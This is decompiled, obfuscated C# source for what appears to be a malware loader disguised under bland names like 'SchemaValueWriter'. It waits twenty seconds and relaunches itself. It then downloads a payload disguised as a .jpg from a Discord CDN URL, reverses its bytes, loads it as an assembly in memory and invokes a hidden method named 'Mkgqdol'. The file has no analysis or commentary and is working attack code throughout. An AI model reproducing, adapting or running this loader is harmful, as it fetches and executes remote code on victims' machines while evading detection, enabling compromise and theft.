using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Atsthjjfumvdxjgbafdfm;

internal class SchemaValueWriter
{
	private static byte[] m_Strategy;

	private static SchemaValueWriter CalculateFacade;

	[STAThread]
	private static void Main(string[] args)
	{
		if (args.Length == 1 && args[0].ToString() == Environment.UserName)
		{
			SetupStrategy();
			ViewStrategy();
			InterruptStrategy();
			return;
		}
		typeof(Thread).GetMethod("Sleep", new Type[1] { typeof(int) })!.Invoke(null, new object[1] { 10000 });
		typeof(Thread).GetMethod("Sleep", new Type[1] { typeof(int) })!.Invoke(null, new object[1] { 10000 });
		Process.Start(Process.GetCurrentProcess().MainModule!.FileName, Environment.UserName);
	}

	private static void ViewStrategy()
	{
		Assembly.Load(m_Strategy);
	}

	private static void SetupStrategy()
	{
		while (true)
		{
			int num = 0;
			if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_122d0f8ad32e4afbadc3874b11bfbc3c != 0)
			{
				goto IL_0012;
			}
			goto IL_0027;
			IL_0027:
			try
			{
				InitFacade(SecurityProtocolType.Tls12);
			}
			catch
			{
			}
			goto IL_003a;
			IL_003a:
			m_Strategy = new BinaryReader((Stream)PrepareFacade(CallFacade(WebRequest.Create("http://cdn.discordapp.com/attachments/932607293869146142/941782821578633216/Sjxupcet.jpg")))).ReadBytes(82986041);
			num = 0;
			if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_2ce3a561540d412b83294020764efd2e != 0)
			{
				break;
			}
			goto IL_0012;
			IL_0012:
			switch (num)
			{
			case 1:
				break;
			default:
				goto IL_0027;
			case 3:
				goto IL_003a;
			case 2:
				goto end_IL_0001;
			}
			continue;
			end_IL_0001:
			break;
		}
		VerifyFacade(m_Strategy, 0, m_Strategy.Length);
	}

	private static void InterruptStrategy()
	{
		string value = default(string);
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		while (true)
		{
			IL_01d4:
			int num = 0;
			int num2 = 1;
			if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_f7676c1507394a2a84a7b6af826bb0e2 != 0)
			{
				goto IL_0138;
			}
			goto IL_0182;
			IL_0182:
			while (true)
			{
				switch (num2)
				{
				case 17:
					Console.WriteLine(value);
					break;
				case 3:
					break;
				case 14:
					goto IL_004a;
				case 12:
					goto IL_0063;
				case 10:
					goto IL_009c;
				case 7:
					goto IL_00a3;
				case 1:
				case 5:
					goto IL_00bd;
				case 13:
					goto IL_00e4;
				case 8:
					goto IL_00eb;
				case 11:
					goto IL_00ee;
				case 16:
					goto IL_011a;
				case 6:
					goto IL_011e;
				default:
					goto IL_0138;
				case 4:
					value = (string)((Type)((object[])CompareFacade(((AppDomain)CalcFacade()).GetAssemblies()[num]))[num3]).GetMethods()[num4].Invoke(null, null);
					num2 = 6;
					if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_a24eb49714b741b7b93248d6239f2a51 == 0)
					{
						continue;
					}
					goto case 17;
				case 2:
					goto IL_01d4;
				case 9:
					return;
				}
				break;
			}
			goto IL_000d;
			IL_000d:
			num4++;
			goto IL_0013;
			IL_0013:
			flag = num4 < ((Assembly)((object[])ResolveFacade(AppDomain.CurrentDomain))[num]).GetExportedTypes()[num3].GetMethods().Length;
			num2 = 4;
			if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_f0ebb37116c34909ad8069aa00da307c == 0)
			{
				goto IL_004a;
			}
			goto IL_0182;
			IL_004a:
			if (!flag)
			{
				num2 = 7;
				if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_1711d16d94cc4f35ab6714eb02699b15 == 0)
				{
					goto IL_0063;
				}
				goto IL_0182;
			}
			flag2 = RemoveFacade(PublishFacade(((Type)((object[])CompareFacade(((object[])ResolveFacade(AppDomain.CurrentDomain))[num]))[num3]).GetMethods()[num4]), "Mkgqdol");
			goto IL_009c;
			IL_011e:
			num++;
			goto IL_00bd;
			IL_0063:
			num3++;
			goto IL_00ee;
			IL_0138:
			num4 = 0;
			goto IL_0013;
			IL_009c:
			if (!flag2)
			{
				goto IL_000d;
			}
			goto IL_00a3;
			IL_00a3:
			MapFacade();
			num2 = 4;
			if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_e43355b5c8c1456aa5eaf931736c3698 == 0)
			{
				goto IL_00bd;
			}
			goto IL_0182;
			IL_00bd:
			flag3 = num < ((AppDomain)CalcFacade()).GetAssemblies().Length;
			num2 = 2;
			if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_01114d77ff0043589448ce5c2643021b != 0)
			{
				goto IL_00e4;
			}
			goto IL_0182;
			IL_00e4:
			if (!flag3)
			{
				break;
			}
			goto IL_00eb;
			IL_00eb:
			num3 = 0;
			goto IL_00ee;
			IL_00ee:
			flag4 = num3 < ((Array)CompareFacade(((object[])ResolveFacade(CalcFacade()))[num])).Length;
			num2 = 1;
			if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_f9d5c02b7d5f46819543cda79f82da51 != 0)
			{
				goto IL_011a;
			}
			goto IL_0182;
			IL_011a:
			if (!flag4)
			{
				goto IL_011e;
			}
			num2 = 0;
			if (_003CModule_003E_007B3d727352_002D7f25_002D48af_002D8725_002Df05974804181_007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_f1e678edf49a4b6ba2d6daa4013644db != 0)
			{
				goto IL_0138;
			}
			goto IL_0182;
		}
	}

	internal static bool PrintFacade()
	{
		return CalculateFacade == null;
	}

	internal static SchemaValueWriter RateFacade()
	{
		return CalculateFacade;
	}

	internal static void InitFacade(SecurityProtocolType securityProtocolType_0)
	{
		ServicePointManager.SecurityProtocol = securityProtocolType_0;
	}

	internal static object CallFacade(object object_0)
	{
		return ((WebRequest)object_0).GetResponse();
	}

	internal static object PrepareFacade(object object_0)
	{
		return ((WebResponse)object_0).GetResponseStream();
	}

	internal static void VerifyFacade(object object_0, int int_0, int int_1)
	{
		Array.Reverse((Array)object_0, int_0, int_1);
	}

	internal static object ResolveFacade(object object_0)
	{
		return ((AppDomain)object_0).GetAssemblies();
	}

	internal static object CompareFacade(object object_0)
	{
		return ((Assembly)object_0).GetExportedTypes();
	}

	internal static object PublishFacade(object object_0)
	{
		return ((MemberInfo)object_0).Name;
	}

	internal static bool RemoveFacade(object object_0, object object_1)
	{
		return (string?)object_0 == (string?)object_1;
	}

	internal static void MapFacade()
	{
		GC.Collect();
	}

	internal static object CalcFacade()
	{
		return AppDomain.CurrentDomain;
	}
}
